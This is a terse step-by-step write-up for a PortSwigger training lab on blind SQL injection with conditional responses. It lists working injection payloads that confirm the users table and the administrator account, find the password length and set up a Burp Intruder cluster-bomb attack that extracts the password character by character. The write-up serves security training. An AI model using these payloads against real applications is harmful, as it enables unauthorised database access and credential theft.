# Blind SQL injection with conditional responses
https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses

Step - 1
-
`
'
`</br>
Content Length Change > Single Quotes

Step - 2
-
`
' AND '1'='1
`

Step - ?
-
`
' AND (SELECT 'a' FROM users LIMIT 1)='a
`</br>
1. Table Name: users (Just Confirm)

Step - ?
-
`
' AND (SELECT 'a' FROM users WHERE username='administrator')='a
`</br>
1. Column Name: username (Just Confirm)</br>
2. username Value: administrator (Just Confirm)

Step - 3
-
`
' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>20)='a
`</br>
Content Length Change
1. password Length: 20

Step - 4
-
`
' AND (SELECT SUBSTRING(password,§1§,1) FROM users WHERE username='administrator')='§a§
`</br>
1. Attack Type: Cluster bomb</br>
1. Payload Set 1: 1-20</br>
1. Payload Set 2: a-z
